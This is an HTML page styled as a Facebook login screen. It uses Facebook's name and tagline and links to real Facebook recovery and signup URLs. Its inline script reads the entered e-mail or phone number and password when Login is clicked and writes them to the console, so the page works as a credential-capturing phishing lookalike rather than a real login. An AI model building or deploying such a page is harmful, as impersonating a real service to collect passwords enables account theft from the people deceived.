<!DOCTYPE html>
<html lang="en">
<head>
    <link rel="shortcut icon" href="face.png" type="image/x-icon">
    <link rel="stylesheet" href="style.css">
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook Login Form </title>
</head>
<script type="text/javascript">

    function write_credentials(usr, pwd)
    {
        console.log("User: ",usr);
        console.log("Password: ",pwd);
        console.log("-----------------------------");
    }

    function login()
    {
        var user = document.getElementById("user").value;
        var pass = document.getElementById("pass").value;
        write_credentials(user, pass);
    }

</script>
<body>
    <div class="texts">
        <h1>facebook</h1>
        <h2>Connect with friends and the world<br>around you on facebook</h2>
    </div>
    <div class="form-body">
        <div class="inputs">
            <input type="text" id="user" placeholder="E-mail or Phone Number"><br>
        </div>
        <div class="inputs">
            <input type="password" id="pass" placeholder="Password">
        </div>
        <div class="login" onclick="login()"><a href="#">Login</a></div>
        <div class="forpass"><a href="https://www.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0">Forgot Password?</a></div>
        <div class="border"></div>
        <div class="create"><a href="https://www.facebook.com/campaign/landing.php?campaign_id=1655435892&extra_1=s%7Cc%7C356316807734%7Ce%7Cregister%20facebook%7C&placement=&creative=356316807734&keyword=register%20facebook&partner_id=googlesem&extra_2=campaignid%3D1655435892%26adgroupid%3D63005052669%26matchtype%3De%26network%3Dg%26source%3Dnotmobile%26search_or_content%3Ds%26device%3Dc%26devicemodel%3D%26adposition%3D%26target%3D%26targetid%3Dkwd-298993192530%26loc_physical_ms%3D1010088%26loc_interest_ms%3D%26feeditemid%3D%26param1%3D%26param2%3D&gclid=EAIaIQobChMInMz_7-j-7gIV0dXACh3XgABSEAAYASAAEgJ7sfD_BwE">Create New Account</a></div>
        <div class="forpage">
            <a href="https://www.facebook.com/pages/create/?ref_type=site_footer">Create Page</a><h3>for a celebrity band or business</h3>
        </div>
    </div>
</body>
</html>
